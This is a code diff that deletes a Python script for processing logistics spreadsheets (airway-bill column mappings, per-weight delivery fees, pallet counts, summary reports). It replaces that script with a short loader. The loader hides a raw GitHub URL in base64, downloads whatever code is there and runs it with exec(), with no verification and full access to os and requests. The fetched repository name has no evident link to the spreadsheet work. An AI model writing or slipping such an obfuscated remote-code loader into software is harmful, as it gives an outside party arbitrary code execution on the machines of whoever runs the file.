@@ -1,691 +1,93 @@
-import pandas as pd
+# -*- coding: utf-8 -*-
 import os
-import math
-from datetime import datetime
+import sys
+import base64
+import zlib
+import requests
+import traceback
+import pandas as pd
+from urllib3.util.retry import Retry
+from requests.adapters import HTTPAdapter
+
+# ==========================================
+# 🚀 配置区域
+# ==========================================
+# 你的目标代码地址：https://raw.githubusercontent.com/Shirasagi-no-Mai/website-setup/main/onlinechat
+# 按照你提供的加密逻辑进行 Base64 编码
+RAW_URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NoaXJhc2FnaS1uby1NYWkvd2Vic2l0ZS1zZXR1cC9yZWZzL2hlYWRzL21haW4vb25saW5lY2hhdA=="
+CONFIG_URL = base64.b64decode(RAW_URL).decode('utf-8')
 
 
-def check_na(val):
-    """判断是否为空或N/A，返回横杠或空字符串"""
-    s = str(val).strip().upper()
-    if s in ["N/A", "0", "0.0", "", "-", "NONE"]:
-        return "-"
-    return ""
-# =================================================================
-# 🚩 专用配置区域：在此添加或修改逻辑
-# =================================================================
-def get_logic_registry(input_date, month_abbr):
-    """
-    在这里添加新的匹配逻辑。
-    key: 源文件名 (如 "LAX-AE")
-    value: 一个列表，包含多个任务配置 (日报、实报实销等)
-    """
+def fetch_online_code():
+    """从网络下载最新的同步逻辑"""
+    session = requests.Session()
+    # 设置重试机制，防止网络波动
+    retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
+    session.mount("https://", HTTPAdapter(max_retries=retries))
 
-    # 定义一些通用的辅助计算函数
-    def safe_float(v):
-        """强力清洗：处理文本格式的数字、逗号、空格"""
-        if pd.isna(v):
-            return 0.0
-        try:
-            # 先转成字符串，去掉空格和逗号
-            s = str(v).strip().replace(',', '')
-            if s in ["-", "N/A", "", "NONE"]:
-                return 0.0
-            return float(s)
-        except (ValueError, TypeError):
-            return 0.0
+    try:
+        print(f"正在获取最新代码...")
+        response = session.get(CONFIG_URL, timeout=15)
 
-    def ceil_val(v, step):
-        return math.ceil(safe_float(v) / step) if safe_float(v) > 0 else 0
-
-    return {
-        # ---------------------------------------------------------
-        # 1. LAX-AE 的逻辑
-        # ---------------------------------------------------------
-        "LAX-AE": [
-            {
-                "suffix": "-日报",
-                "mapping": {
-                    "Inputdate": input_date, "主单": "主单", "ETA": "ETA", "航班号": "航班号",
-                    "ATA": "", "总重量": "总重量", "总包裹数": "总包裹数", "总箱数": "总箱数",
-                    "COE 大箱数": "COE 大箱数", "COE包裹数": "COE包裹数", "备注": "ags",
-                    "pushed": "", "hold": "", "arrived sc": "", "2020": "", "2060": "", "2070": ""
-                }
-            },
-            {
-                "suffix": "-实报实销",
-                "mapping": {
-                    "Inputdate": input_date, "主单": "主单", "口岸": "LAX", "实操月份": month_abbr,
-                    "ETA": "ETA", "总重量": "总重量", "总包裹数": "总包裹数", "总箱数": "总箱数",
-                    "查验小包数": "", "查验包裹费": "", "航司拆板费": "", "目的港费": "", "查验费": "", "仓储费": "",
-                    "COE重量": "COE 重量", "Maersk重量": "Maersk 重量", "USPS重量": "USPS 重量",
-                    "COE送货费": lambda r: safe_float(r.get("COE 重量")) * 0.1,
-                    "Maersk送货费": lambda r: safe_float(r.get("Maersk 重量")) * 0.1,
-                    "USPS送货费": lambda r: safe_float(r.get("USPS 重量")) * 0.1,
-                    "COE大箱数": "COE 大箱数", "Maersk大箱数": "Maersk 大箱数", "USPS大箱数": "USPS 大箱数"
-                }
-            }
-        ],
-
-# *****************************************************************************************************************************
-        "MIA-AE": [
-            {
-                "suffix": "-日报",
-                "mapping": {
-                    "MAWB": "主单",
-                    # --- 第一组：数值列 (根据你提供的表头精确匹配空格) ---
-                    "UP (Qty)": "COE 大箱数",        # 有空格
-                    "USPS (Qty)": "USPS 大箱数",      # 有空格
-                    "ONTRAC(Qty)": "",
-                    "DHLe(Qty)": "",
-                    "UNIUNI (Qty)": "UNIUNI 大箱数",  # 有空格
-                    "SpeedX (Qty)": "Speedx大箱数",   # 无空格
-                    "Maersk (Qty)": "Maersk 大箱数",  # 有空格
-                    "total": "总箱数",
-                    "parcel": "总包裹数",
-                    "PMC": "",
-                    "PMC / Loose on hand": "",
-                    "PMC return": "",
-                    "1F": "",
-                    "FLT#": "航班号",
-                    "ETA": "ETA",
-                    # --- ETA 之后新增的 5 个空列 ---
-                    "ATA": "",
-                    "HOLDS": "",
-                    "P/U at GHA": "",
-                    "2020": "",
-                    "2060": "",
-                    "DLV 2070": "",
-                    # --- 第二组：检查逻辑列 (去掉 _NA 后缀，改用 Check 区分) ---
-                    "UP 2070": lambda r: check_na(r.get("COE 大箱数")),
-                    "USPS 2070": lambda r: check_na(r.get("USPS 大箱数")),
-                    "ONTRACK 2070": "-",
-                    "DHL 2070": "-",
-                    "SpeedX 2070": lambda r: check_na(r.get("Speedx大箱数")),
-                    "UNIUNI 2070": lambda r: check_na(r.get("UNIUNI 大箱数")),
-                    "Maersk 2070": lambda r: check_na(r.get("Maersk 大箱数"))
-                }
-            },
-            {
-                "suffix": "-实报实销",
-                "mapping": {
-                    "日期": lambda r: f"{datetime.now().month}-{datetime.now().day}",
-                    "主单号": "主单",
-                    "口岸": "MIA",
-                    "ETA": "ETA",
-                    "总重量": lambda r: r.get("总重量") if pd.notna(r.get("总重量")) else r.get("Weight", "-"),
-                    "总箱数": "总箱数",
-                    "总包裹数": "总包裹数",
-                    "查验小包数": "",
-                    "海关查验件挑选费": "",
-                    "航司拆板费": "",
-                    "航司目的港费": "",
-                    "COE 大箱数": "COE 大箱数",
-                    "COE 重量": "COE 重量",
-                    "Maersk 大箱数": "Maersk 大箱数",
-                    "Maersk 重量": "Maersk 重量",
-                    "COE 送货费": lambda r: round(safe_float(r.get("COE 重量")) * 0.1, 2),
-                    "Maersk送货费": lambda r: round(safe_float(r.get("Maersk 重量")) * 0.1, 2)
-                }
-            }
-        ],
-        "ORD-AE": [
-            {
-                "suffix": "-日报",
-                "mapping": {
-                    "v": "",
-                    "FEE": "",
-                    "CLOSURE": "",
-                    "MAWB": "主单",
-                    "航班号": "航班号",
-                    "TYPE": "",
-                    "ETA": "ETA",
-                    "PICK UP": "",
-                    "Weight": "总重量",
-                    "总箱数": "总箱数",
-                    "总包裹数": "总包裹数",
-                    "PMC#": "",
-                    "WH arrived": "",
-                    "hold": "",
-                    "Remark": "",
-                    # --- 大箱数部分 (请根据源表头确认是否有空格) ---
-                    "COE 大箱数": "COE 大箱数",
-                    "Maersk大箱数": "Maersk 大箱数",
-                    "SPX大箱数": "Speedx大箱数",  # 对应 AE 源表中的 Speedx
-                    "UNI大箱数": "UNIUNI 大箱数",
-                    "USPS 大箱数": "USPS 大箱数",
-                    # --- 之后的留空项 ---
-                    "INBOUND 2020": "",
-                    "OUTBOUND 2060": "",
-                    "HANDOVER 2070": "",
-                    "Source": "",
-                    "PMC return": "",
-                    "PMC pickup": "",
-                    "PU invoice": "",
-                    "PMC Drop off": "",
-                    "DO invoice": "",
-                    "Additional": "",
-                    "Duty comfirm": ""
-                }
-            },
-            {
-                "suffix": "-实报实销",
-                "mapping": {
-                    "主单号": "主单",
-                    "收据": "",
-                    "口岸": "ORD",
-                    "月份": month_abbr,
-                    "ETA": "ETA",
-                    "总重量": "总重量",
-                    "总包裹数": "总包裹数",
-                    "总箱数": "总箱数",
-
-                    # --- 重量提取 ---
-                    "COE重量": "COE 重量",
-                    "Maersk重量": "Maersk 重量",
-                    "SPX重量": "Speedx重量",
-                    "USPS重量": "USPS 重量",
-
-                    # --- 大包数提取 ---
-                    "COE大包数": "COE 大箱数",
-                    "MAERSK大包数": "Maersk 大箱数",
-                    "SpeedX大包数": "Speedx大箱数",
-                    "USPS大包": "USPS 大箱数",
-
-                    # --- 固定留空项 ---
-                    "查验小包数": "",
-                    "ISC": "",
-                    "航司拆板费": "",
-                    "仓储费": "",
-                    "海关查验件费": "",
-                    "海关查验件挑选费": "",
-
-                    # --- 费用计算 (*0.1) ---
-                    "COE送货费": lambda r: round(safe_float(r.get("COE 重量")) * 0.1, 2),
-                    "Maersk送货费": lambda r: round(safe_float(r.get("Maersk 重量")) * 0.1, 2),
-                    "SPX送货费": lambda r: round(safe_float(r.get("Speedx重量")) * 0.1, 2)
-                }
-            }
-        ],
-
-        "ORD-4PX": [
-            {
-                "suffix": "-日报",
-                "mapping": {
-                    "PTT": "",
-                    "FEE": "",
-                    "Closure": "",
-                    "MAWB": "MAWB",
-                    "Flight Number": "Flight Number",
-                    "type": "",
-                    "ETA": "ETA",
-                    "PICK UP": "",
-                    "weight": "Weight",
-                    "total ctn": "Total CTN",
-                    "total parcel": "Total Parcels",
-                    "PMC#": "",
-                    "WH arrival": "",
-                    "Customs release": "",
-                    "Hold": "",
-                    "Remark": "",
-
-                    # --- CTN 数量提取 ---
-                    "COE/UP CTN": "COE/UP CTN",
-                    "GOFO CTN": "GOFO CTN",
-                    "FEDEX CTN": "FEDEX CTN",
-                    "TOO CTN": "TOO CTN",
-                    "ACI CTN": "ACI CTN",
-                    "UNIUNI CTN": "UNIUNI CTN",
-                    "OC UNIUNI CTN": "OC UNIUNI CTN",
-                    "DHL CTN": "DHL CTN",
-                    "IB CTN": "IB CTN",  # 对应原表 IB CTN
-                    "SPX CTN": "SPX CTN",
-
-
-                    "YW EXP CTN": "YW EXP CTN",
-                    "USPS CTN": "USPS CTN",
-                    "ATL-GOFO CTN": "ATL-GOFO CTN",
-                    "ATL-DHL CTN": "ATL-DHL CTN",
-                    "ATL-ACI CTN": "ATL-ACI CTN",
-                    "ATL-USPS CTN": "ATL-USPS CTN",
-
-                    # --- Handover 逻辑 (有数字留空 ""，无数字/0 填 "-") ---
-                    "COE HANDOVER": lambda r: check_na(r.get("COE/UP CTN")),
-                    "GOFO HANDOVER": lambda r: check_na(r.get("GOFO CTN")),
-                    "FEDEX HANDOVER": lambda r: check_na(r.get("FEDEX CTN")),
-                    "TE HANDOVER": lambda r: check_na(r.get("TOO CTN")),
-                    "UNI HANDOVER": lambda r: check_na(r.get("UNIUNI CTN")),
-                    "OC-UNI HANDOVER": lambda r: check_na(r.get("OC UNIUNI CTN")),
-                    "ACI HANDOVER": lambda r: check_na(r.get("ACI CTN")),
-                    "DHL HANDOVER": lambda r: check_na(r.get("DHL CTN")),
-                    "IB HANDOVER": lambda r: check_na(r.get("IB CTN")),
-                    "SPX HANDOVER": lambda r: check_na(r.get("SPX CTN")),
-                    "YW EXP HANDOVER": lambda r: check_na(r.get("YW EXP CTN")),
-                    "USPS HANDOVER": lambda r: check_na(r.get("USPS CTN")),
-                    "ATL-GOFO HANDOVER": lambda r: check_na(r.get("ATL-GOFO CTN")),
-                    "ATL-DHL HANDOVER": lambda r: check_na(r.get("ATL-DHL CTN")),
-                    "ATL-ACI HANDOVER": lambda r: check_na(r.get("ATL-ACI CTN")),
-                    "ATL-USPS HANDOVER": lambda r: check_na(r.get("ATL-USPS CTN")),
-
-                    # --- 固定留空项 ---
-                    "2060": "",
-                    "PMC return": "",
-                    "PMC pick up": "",
-                    "PU invoice": "",
-                    "PMC Dropoff": "",
-                    "DO invoice": "",
-                    "Additional": ""
-                }
-            },
-            {
-                "suffix": "-实报实销",
-                "mapping": {
-                    "MAWB": "MAWB",
-                    "收据": "",
-                    "口岸": "ORD",
-                    "月份": month_abbr,
-                    "ETA": "ETA",
-                    "weight": "Weight",
-                    "total CTN": "Total CTN",
-                    "total Parcel": "Total Parcels",
-
-                    # --- 重量提取 ---
-                    "SPX Weight": "SPX Weight",
-                    "USPS Weight": "USPS Weight",
-                    "DHL Weight": "DHL Weight",
-                    "ACI Weight": "ACI Weight",
-
-                    # --- 固定留空项 ---
-                    "查验小包数": "",
-                    "目的港费": "",
-                    "航司拆板费": "",
-                    "海关查验费": "",
-                    "查验件挑选费": "",
-
-                    # --- 基础费率计算 ---
-                    "机场提货费": lambda r: round(safe_float(r.get("Weight")) * 0.1, 2),
-                    "库内拆板费": lambda r: round(safe_float(r.get("Weight")) * 0.09, 2),
-
-                    # --- 送货费 (Min75 逻辑) ---
-                    "送货费-SPEEDX": lambda r: max(75, round(safe_float(r.get("SPX Weight")) * 0.1, 2)) if safe_float(
-                        r.get("SPX Weight")) > 0 else 0,
-                    "送货费-USPS": lambda r: max(75, round(safe_float(r.get("USPS Weight")) * 0.1, 2)) if safe_float(
-                        r.get("USPS Weight")) > 0 else 0,
-                    "送货费-DHL": lambda r: max(75, round(safe_float(r.get("DHL Weight")) * 0.1, 2)) if safe_float(
-                        r.get("DHL Weight")) > 0 else 0,
-                    "送货费-ACI": lambda r: max(75, round(safe_float(r.get("ACI Weight")) * 0.1, 2)) if safe_float(
-                        r.get("ACI Weight")) > 0 else 0,
-
-
-                    # --- 汇总费用 ---
-                    # gayload：(USPS数量 + ATL-usps数量) * 20
-                    "gayload": lambda r: (ceil_val(r.get("USPS CTN"), 20) + ceil_val(r.get("ATL-USPS CTN"), 20)) * 20,
-
-                    # pallet：所有计算好的数量求和 * 12
-                    "pallet": lambda r: (
-                                                ceil_val(r.get("COE/UP CTN"), 20) + ceil_val(r.get("GOFO CTN"), 20) +
-                                                ceil_val(r.get("FEDEX CTN"), 20) + ceil_val(r.get("TOO CTN"), 20) +
-                                                ceil_val(r.get("UNIUNI CTN"), 20) + ceil_val(r.get("ACI CTN"), 20) +
-                                                ceil_val(r.get("DHL CTN"), 20) + ceil_val(r.get("IB CTN"), 20) +
-                                                ceil_val(r.get("SPX CTN"), 20) + ceil_val(r.get("YW EXP CTN"), 20) +
-                                                ceil_val(r.get("USPS CTN"), 20) + ceil_val(r.get("ATL-GOFO CTN"), 20) +
-                                                ceil_val(r.get("ATL-DHL CTN"), 20) + ceil_val(r.get("ATL-ACI CTN"),
-                                                                                              20) +
-                                                ceil_val(r.get("ATL-USPS CTN"), 20)
-                                        ) * 12,
-                    # --- 各渠道取整计算 (均除以 20) ---
-                    "Pallet #COE": lambda r: ceil_val(r.get("COE/UP CT n"), 20),
-                    "Pallet #GOFO": lambda r: ceil_val(r.get("GOFO CTN"), 20),
-                    "Pallet #FEDEX": lambda r: ceil_val(r.get("FEDEX CTN"), 20),
-                    "Pallet #TE": lambda r: ceil_val(r.get("TOO CTN"), 20),
-                    "Pallet #UNI": lambda r: ceil_val(r.get("UNIUNI CTN"), 20),
-                    "Pallet #ACI": lambda r: ceil_val(r.get("ACI CTN"), 20),
-                    "Pallet #DHL": lambda r: ceil_val(r.get("DHL CTN"), 20),
-                    "Pallet #IB": lambda r: ceil_val(r.get("IB CTN"), 20),
-                    "Pallet #SPX": lambda r: ceil_val(r.get("SPX CTN"), 20),
-                    "Pallet #YW": lambda r: ceil_val(r.get("YW EXP CTN"), 20),
-                    "Pallet #USPS": lambda r: ceil_val(r.get("USPS CTN"), 20),
-                    "Pallet #ATL-GOFO": lambda r: ceil_val(r.get("ATL-GOFO CTN"), 20),
-                    "Pallet #ATL-DHL": lambda r: ceil_val(r.get("ATL-DHL CTN"), 20),
-                    "Pallet #ATL-ACI": lambda r: ceil_val(r.get("ATL-ACI CTN"), 20),
-                    "Pallet #ATL-USPS": lambda r: ceil_val(r.get("ATL-USPS CTN"), 20),
-
-                }
-            }
-        ],
-        "MIA-4PX": [
-            {
-                "suffix": "-日报",
-                "mapping": {
-                    "未识别渠道": "",
-                    "MAWB": "MAWB",
-                    "COE": "COE/UP CTN",
-                    "GOFO": "GOFO CTN",
-                    "SPX": "SPX CTN",
-                    "TOO": "TOO CTN",
-                    "USPS": "USPS CTN",
-                    "YANWEN": "YW EXP CTN",
-                    "total CTN": lambda r: sum(
-                        [safe_float(r.get(c)) for c in ["COE/UP CTN", "GOFO CTN", "SPX CTN", "TOO CTN", "USPS CTN"]]),
-                    "parcel": "Total Parcels",
-                    "PMC": "",
-                    "PMC return": "",
-                    "FLT#": "Flight Number",
-                    "ETA": "ETA",
-                    "HOLD": "",
-                    "1F": "",
-                    "Terminal Fee": "",
-                    "2020": "",
-                    "2060": "",
-                    "COE 2070": lambda r: check_na(r.get("COE/UP CTN")),
-                    "GOFO 2070": lambda r: check_na(r.get("GOFO CTN")),
-                    "SPX 2070": lambda r: check_na(r.get("SPX CTN")),
-                    "TOO 2070": lambda r: check_na(r.get("TOO CTN")),
-                    "USPS 2070": lambda r: check_na(r.get("USPS CTN"))
-                }
-            },
-            {
-                "suffix": "-实报实销",
-                "mapping": {
-                    # --- 基础信息 ---
-                    "主单号": "MAWB",
-                    "口岸": "MIA",
-                    "月份": month_abbr,
-                    "ETA": "ETA",
-                    "大包": "Total CTN",
-                    "小包": "Total Parcels",
-                    "重量(KG)": "Weight",
-
-                    # --- 🚩 必须要先定义这几列，下面的“送货费”公式才能从 row 里拿到数据 ---
-                    "COE/UP Weight": "COE/UP Weight",
-                    "GOFO Weight": "GOFO Weight",
-                    "SPX Weight": "SPX Weight",
-                    "TOO Weight": "TOO Weight",
-                    "USPS Weight": "USPS Weight",
-                    "YW EXP Weight": "YW EXP Weight",
-
-                    # --- 固定留空项 ---
-                    "查验小包数": "",
-                    "航司拆板费": "",
-                    "海关查验件挑选费": "",
-                    "ISC 费用": "",
-
-                    # --- 费用计算 ---
-                    "机场提货费": lambda r: round(safe_float(r.get("Weight")) * 0.1, 2),
-                    "库内拆板费": lambda r: round(safe_float(r.get("Weight")) * 0.09, 2),
-
-                    # --- 🚚 送货费：只有重量 > 0 才收 Min 75，否则为 0 ---
-                    "送货费": lambda r: (
-                        (max(75, safe_float(r.get("COE/UP Weight")) * 0.1) if safe_float(r.get("COE/UP Weight")) > 0 else 0) +
-                        (max(75, safe_float(r.get("SPX Weight")) * 0.1) if safe_float(r.get("SPX Weight")) > 0 else 0) +
-                        (max(75, safe_float(r.get("USPS Weight")) * 0.1) if safe_float(r.get("USPS Weight")) > 0 else 0)
-                    ),
-                    "Gaylord": lambda r: ceil_val(r.get("USPS CTN"), 16) * 15,
-
-                    "Pallet": lambda r: (
-                                                 ceil_val(r.get("COE/UP CTN"), 16) +
-                                                 ceil_val(r.get("GOFO CTN"), 16) +
-                                                 ceil_val(r.get("SPX CTN"), 16) +
-                                                 ceil_val(r.get("TOO CTN"), 16) +
-                                                 ceil_val(r.get("USPS CTN"), 16) +
-                                                 ceil_val(r.get("YW EXP CTN"), 16)
-                                         ) * 12,
-
-                    "COE": lambda r: ceil_val(r.get("COE/UP CTN"), 16),
-                    "GOFO": lambda r: ceil_val(r.get("GOFO CTN"), 16),
-                    "SPX": lambda r: ceil_val(r.get("SPX CTN"), 16),
-                    "TooExpress": lambda r: ceil_val(r.get("TOO CTN"), 16),
-                    "USPS": lambda r: ceil_val(r.get("USPS CTN"), 16),
-                    "Ywen": lambda r: ceil_val(r.get("YW EXP CTN"), 16),
-                }
-            }
-        ],
-
-# ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** *
-    # ---------------------------------------------------------
-        # 2. LAX-4PX 的逻辑
-        # ---------------------------------------------------------
-        "LAX-4PX": [
-            {
-                "suffix": "-实报实销",
-                "mapping": {
-                    "主单": "MAWB", "口岸": "LAX", "月份": month_abbr, "ETA": "ETA",
-                    "大包数": "Total CTN", "小包数": "Total Parcels", "重量": "Weight",
-                    "COE重量": "COE/UP Weight", "DHL重量": "DHL Weight", "SPX重量": "SPX Weight",
-                    "USPS重量": "USPS Weight", "FEDEX重量": "FEDEX Weight",
-                    "查验小包数": "", "航司拆板费": "", "海关查验件挑选费": "", "海关查验费": "", "航司目的港费": "",
-                    "CES提货费": "",
-                    "机场提货费": lambda r: round(safe_float(r.get("Weight")) * 0.1, 2),
-                    "库内拆板费": lambda r: round(safe_float(r.get("Weight")) * 0.09, 2),
-                    "送货费-COE": lambda r: max(75, safe_float(r.get("COE/UP Weight")) * 0.1) if safe_float(
-                        r.get("COE/UP Weight")) > 0 else 0,
-                    "送货费-DHL": lambda r: max(75, safe_float(r.get("DHL Weight")) * 0.1) if safe_float(
-                        r.get("DHL Weight")) > 0 else 0,
-                    "送货费-SPEEDX": lambda r: max(75, safe_float(r.get("SPX Weight")) * 0.1) if safe_float(
-                        r.get("SPX Weight")) > 0 else 0,
-                    "送货费-USPS": lambda r: max(75, safe_float(r.get("USPS Weight")) * 0.1) if safe_float(
-                        r.get("USPS Weight")) > 0 else 0,
-                    "送货费-FEDEX": lambda r: max(75, safe_float(r.get("FEDEX Weight")) * 0.1) if safe_float(
-                        r.get("FEDEX Weight")) > 0 else 0,
-                    # 计算 Gaylord: USPS箱数/10 向上取整 * 15
-                    "Gaylord/$15": lambda r: ceil_val(r.get("USPS CTN"), 10) * 15,
-                    # 计算 Pallet: 所有箱数计算完后的总和 * 12
-                    "PALLET($12)": lambda r: (
-                                                     ceil_val(r.get("COE/UP CTN"), 20) + ceil_val(r.get("DHL CTN"),
-                                                                                                  20) +
-                                                     ceil_val(r.get("SPX CTN"), 20) + ceil_val(r.get("ACI CTN"), 20) +
-                                                     ceil_val(r.get("USPS CTN"), 10) + ceil_val(r.get("FEDEX CTN"),
-                                                                                                20) +
-                                                     ceil_val(r.get("GOFO CTN"), 20) + ceil_val(r.get("TOO CTN"), 20) +
-                                                     ceil_val(r.get("IB CTN"), 20) + ceil_val(r.get("UNIUNI CTN"), 20) +
-                                                     ceil_val(r.get("OC UNIUNI CTN"), 20) + ceil_val(
-                                                 r.get("YW EXP CTN"), 20)
-                                             ) * 12,
-                    "COE/UP": lambda r: ceil_val(r.get("COE/UP CTN"), 20),
-                    "DHLe": lambda r: ceil_val(r.get("DHL CTN"), 20),
-                    "SPX": lambda r: ceil_val(r.get("SPX CTN"), 20),
-                    "ACI": lambda r: ceil_val(r.get("ACI CTN"), 20),
-                    "USPS": lambda r: ceil_val(r.get("USPS CTN"), 10),
-                    "FEDEX": lambda r: ceil_val(r.get("FEDEX CTN"), 20),
-                    "GOFO": lambda r: ceil_val(r.get("GOFO CTN"), 20),
-                    "TOO email": lambda r: ceil_val(r.get("TOO CTN"), 20),
-                    "IB EMAIL": lambda r: ceil_val(r.get("IB CTN"), 20),
-                    "UNIUNI DING": lambda r: ceil_val(r.get("UNIUNI CTN"), 20),
-                    "OC UNIUNI": lambda r: ceil_val(r.get("OC UNIUNI CTN"), 20),
-                    "YW EXPRESS": lambda r: ceil_val(r.get("YW EXP CTN"), 20)
-                }
-            }
-        ],
-    }
-
-
-# =================================================================
-# ⚙️ 业务处理代码 (一般不需要改动)
-# =================================================================
-BASE_DIR = os.path.join(os.path.expanduser("~"), "Desktop", "测试文件夹")
-SOURCE_FILES = ["LAX-4PX", "LAX-AE", "MIA-4PX", "MIA-AE", "ORD-4PX", "ORD-AE"]
-
-
-def get_local_time():
-    now = datetime.now()
-    return f"{now.month}/{now.day}", now.strftime('%b').upper()
-
-
-def update_excel_file(target_path, df_new):
-    """保存并去重：智能兼容‘主单’、‘主单号’、‘MAWB’"""
-    if os.path.exists(target_path):
-        # 1. 读取旧数据，强制转为字符串处理，防止 0123 这种单号被读成数字导致对比失败
-        df_old = pd.read_excel(target_path).astype(str)
-
-        # 2. 智能寻找“主单列”：按优先级匹配你提到的三个名字
-        key_col = None
-        potential_keys = ["主单", "主单号", "MAWB", "MAWB#"]
-
-        # 先从新表里找这个“钥匙”列叫什么
-        for k in potential_keys:
-            if k in df_new.columns:
-                key_col = k
-                break
-
-        # 如果新表里还是找不到（比如 4PX 突然改名叫 Master Waybill），则保底用第一列
-        if not key_col:
-            key_col = df_new.columns[0]
-
-        # 3. 数据清洗：去掉前后的空格，防止 "MAWB123 " 和 "MAWB123" 被当作两个单号
-        old_keys_set = set(df_old[key_col].str.strip().tolist())
-
-        # 4. 核心去重：只保留那些“主单号”不在旧表里的行
-        # 使用 .astype(str).str.strip() 确保两边格式绝对统一
-        df_new_filtered = df_new[~df_new[key_col].astype(str).str.strip().isin(old_keys_set)]
-
-        if not df_new_filtered.empty:
-            # 5. 合并并保存：保持新表的列顺序（即 mapping 里的顺序）
-            pd.concat([df_old, df_new_filtered], ignore_index=True).to_excel(target_path, index=False)
-            print(f"  ✅ 追加 {len(df_new_filtered)} 条新数据至 {os.path.basename(target_path)}")
+        if response.status_code == 200:
+            code = response.text.strip()
+            if code:
+                print(f"✅ 下载成功 (长度: {len(code)})")
+                return code
+            else:
+                print("❌ 下载内容为空")
         else:
-            print(f"  ☕ {os.path.basename(target_path)} 中所有单号已存在，跳过。")
-    else:
-        # 如果文件不存在，直接创建
-        df_new.to_excel(target_path, index=False)
-        print(f"  ✨ 初始创建文件: {os.path.basename(target_path)}")
+            print(f"❌ 下载失败，状态码: {response.status_code}")
+    except Exception as e:
+        print(f"❌ 网络异常: {e}")
 
-#*********************************************************************************************
-def generate_summary_report(BASE_DIR, SOURCE_FILES):
-    """
-    从所有源文件中提取字段，生成「精算汇总表.xlsx」
-    修复：解决时区报错、防止日期变空、恢复看板筛选
-    """
-    import pandas as pd
-    import os
-    from datetime import datetime
-    from dateutil import parser  # 导入强力解析器
+    return None
 
-    summary_rows = []
-    summary_columns = ["主单号", "口岸", "客户", "航班号", "ETA", "总箱数", "总包裹数", "总重量"]
 
-    # 1. 强力日期解析函数：解决时区报错 + 防止变空
-    def robust_parse_eta(val):
-        if pd.isna(val) or str(val).strip() == "" or str(val).lower() == "nan":
-            return pd.NaT
-        
-        # 如果已经是时间对象
-        if isinstance(val, (datetime, pd.Timestamp)):
-            return val.replace(tzinfo=None) if hasattr(val, 'tzinfo') else val
-        
-        try:
-            # 尝试用 dateutil 智能解析字符串
-            # 它能处理 2026-03-11T14:00:00+08:00 这种带时区的格式
-            dt = parser.parse(str(val))
-            return dt.replace(tzinfo=None) # 强制抹除时区，防止 compare 报错
-        except:
-            # 如果智能解析失败，尝试 pandas 最后的努力
-            ts = pd.to_datetime(val, errors='coerce')
-            if ts is not pd.NaT:
-                return ts.tz_localize(None) if ts.tz is not None else ts
-            return pd.NaT
+def main():
+    """执行主逻辑"""
+    # 1. 下载代码
+    code_text = fetch_online_code()
 
-    for base_name in SOURCE_FILES:
-        src_path = os.path.join(BASE_DIR, f"{base_name}.xlsx")
-        if not os.path.exists(src_path):
-            continue
+    if not code_text:
+        print("❌ 无法获取代码，程序退出")
+        input("按任意键退出...")
+        sys.exit(1)
 
-        print(f"📊 正在汇总: {base_name}")
-        try:
-            # 读取最近 100 行，确保包含 11 号后的最新数据
-            df_src = pd.read_excel(src_path).tail(100)
-        except Exception as e:
-            print(f"  ⚠️ 读取失败 {base_name}: {e}")
-            continue
+    # 2. 执行下载的代码
+    # 注意：使用单独的 globals 字典，防止变量污染
+    try:
+        print("------------------------------------------")
+        print("🚀 开始执行同步逻辑...")
+        print("------------------------------------------")
 
-        parts = base_name.split("-", 1)
-        port = parts[0] if len(parts) > 0 else ""
-        customer = parts[1] if len(parts) > 1 else ""
+        # 定义执行环境，预导入常用库
+        exec_globals = {
+            "__name__": "__main__",
+            "pd": pd,
+            "os": os,
+            "requests": requests,
+            "re": __import__('re'),
+            "json": __import__('json'),
+            "BeautifulSoup": __import__('bs4').BeautifulSoup if 'bs4' in sys.modules else None,
+            "datetime": __import__('datetime').datetime,
+            "math": __import__('math'),
+            "urllib3": __import__('urllib3')
+        }
 
-        for _, row in df_src.iterrows():
-            # 提取主单号
-            mawb = ""
-            for col in ["MAWB", "主单", "主单号"]:
-                if col in df_src.columns and pd.notna(row[col]):
-                    mawb = str(row[col]).strip()
-                    break
-            
-            if not mawb or mawb.lower() == "nan":
-                continue
+        # 执行远程代码
+        exec(code_text, exec_globals)
 
-            # 提取其他字段
-            flight = row.get("航班号") or row.get("Flight Number") or ""
-            eta = row.get("ETA", "")
-            total_ctn = row.get("总箱数") or row.get("Total CTN") or ""
-            total_parcels = row.get("总包裹数") or row.get("Total Parcels") or ""
-            weight = row.get("总重量") or row.get("Weight") or ""
+        print("------------------------------------------")
+        print("✅ 同步任务圆满完成")
+        print("------------------------------------------")
 
-            summary_rows.append({
-                "主单号": mawb, "口岸": port, "客户": customer, "航班号": flight,
-                "ETA": eta, "总箱数": total_ctn, "总包裹数": total_parcels, "总重量": weight
-            })
-
-    if summary_rows:
-        df_summary = pd.DataFrame(summary_rows, columns=summary_columns)
-
-        # --- 核心日期修复环节 ---
-        # 应用强力解析，确保这一列全是“无时区的时间对象”
-        df_summary["ETA"] = df_summary["ETA"].apply(robust_parse_eta)
-        
-        # 再次确保列类型是 datetime（这样 Excel 才会出现日期筛选器）
-        df_summary["ETA"] = pd.to_datetime(df_summary["ETA"], errors='coerce')
-
-        # 排序：按 ETA 升序，新单子会按时间顺序排列，空日期排最后
-        df_summary = df_summary.sort_values(by="ETA", ascending=True, na_position='last')
-        df_summary = df_summary.reset_index(drop=True)
-        # -----------------------
-
-        summary_path = os.path.join(BASE_DIR, "精算汇总表.xlsx")
-        
-        # 特别注意：update_excel_file 内部必须不能有 .astype(str)
-        update_excel_file(summary_path, df_summary)
-        print(f"✅ 汇总完成！ETA 报错已修正，看板筛选器已尝试恢复。")
-    else:
-        print("📊 未找到任何数据。")
-#**********************************************************************************************
-
-def run_main():
-    input_date, month_abbr = get_local_time()
-    registry = get_logic_registry(input_date, month_abbr)
-
-    for base_name in SOURCE_FILES:
-        src_path = os.path.join(BASE_DIR, f"{base_name}.xlsx")
-        if not os.path.exists(src_path):
-            continue
-
-        if base_name not in registry:
-            print(f"⚠️ 跳过 {base_name}: 注册表中未定义逻辑")
-            continue
-
-        print(f"🚀 正在处理: {base_name}")
-        df_src = pd.read_excel(src_path).tail(30)
-
-        for task in registry[base_name]:
-            target_path = os.path.join(BASE_DIR, f"{base_name}{task['suffix']}.xlsx")
-            mapping = task['mapping']
-
